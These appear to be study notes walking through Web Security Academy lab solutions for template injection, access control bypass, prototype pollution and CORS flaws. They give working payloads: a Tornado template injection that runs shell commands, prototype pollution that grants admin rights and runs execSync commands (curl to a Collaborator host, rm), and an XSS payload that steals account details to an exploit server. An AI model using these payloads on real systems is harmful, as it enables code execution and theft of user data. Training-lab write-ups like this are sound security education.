## SSTI Vulnerabilities:
- ==Basic server-side template injection (code context)==  
  Review Tornado Template documentation
  
  The preferred name function has a vulnerability where the parameter can be closed off using curly braces }} and an expression can be inserted e.g. {{7*7}}
  The value 49 does not show in this page but shows in blog posts if the user has commented i.e. username 49}}
  
  Insert payload then refresh the blog post page to trigger the deletion of file
   
  {% import os %}
  {{os.system('rm /home/carlos/morale.txt')
  
  user.name}}{%+import+os+%}{{os.system('rm+/home/carlos/morale.txt')&csrf

## Access Control Vulnerabilities
- ==Method-based access control can be circumvented== 
  Change POST method for /admin-role with username=wiener&action=upgrade to a GET request such that:
  
  GET /admin-roles?username=wiener&action=upgrade HTTP/2

- ==Multi-step process with no access control on one step== 
  The admin-roles has a confirm process which is unprotected - this adds a confirmed=true/false parameter.
  
  Add this to the POST /admin-roles request such that
  action=upgrade&confirmed=true&username=wiener
- ==Referer-based access control==
  GET /admin-roles?username=wiener&action=upgrade HTTP/2
  
  Referer: https://0a7300d0047d7ca980306ccb004f0006.web-security-academy.net/admin

## Prototype Pollution Vulnerabilities
- ==Privilege escalation via server-side prototype pollution==
  Send POST /my-account/change-address request to Repeater
  
  Modify the payload by adding prototype pollution
  
  {"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"z0sPs8VAKDuDNSlOlXADUG0S1XxVzjaG",
  "__proto__":{
        "isAdmin":true
    }}
  Delete carlos
- ==Detecting server-side prototype pollution without polluted property reflection==
  {"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"gOg2W205z4WEG68ZFKqHhyNWmX3LjUxQ"                   ,   "__proto__": {
    "status":444
    }
  } Inject above payload, then inject again but with broken syntax
- ==Bypassing flawed input filters for server-side prototype pollution==
  "__proto__": {
      "foo":"bar"
      }
      Try above, but it wont work. Try:
  "constructor": {
      "prototype": {
              "json spaces":10
              }
                }
  Change response view to Raw and notice spacing has changed. Add "isAdmin": true and delete carlos 
- ==Remote code execution via server-side prototype pollution==
  Identify a prototype pollution source: "__proto__": {
      "json spaces":10
      }
  admin panel has a button for running maintenance jobs. Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes.
  
  Try polluting the prototype with a malicious execArgv property that adds the --eval argument to the spawned child process. Use this to call the execSync() sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example:
  
  "__proto__": {
      "execArgv":[
              "--eval=require('child_process').execSync('curl https://collaborator_id.oastify.com')"
                  ]
                }
  trigger the maintenance jobs again. Notice that these have both failed this time.
  replace the curl command with a command for deleting Carlos's file:
  
  "__proto__": {
      "execArgv":[
              "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
                  ]
                  }
  Run maintenace to solve lab.


## CORS Vulnerabilities:
- ==CORS vulnerability with trusted insecure protocols== 
  1. Response contains the `Access-Control-Allow-Credentials`
  2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
  3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
  4. ```
     <script> document.location="http://stock.lab_id.web-security-academy.net/?productId=4%3cscript>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab_id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-exploit_id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
     ```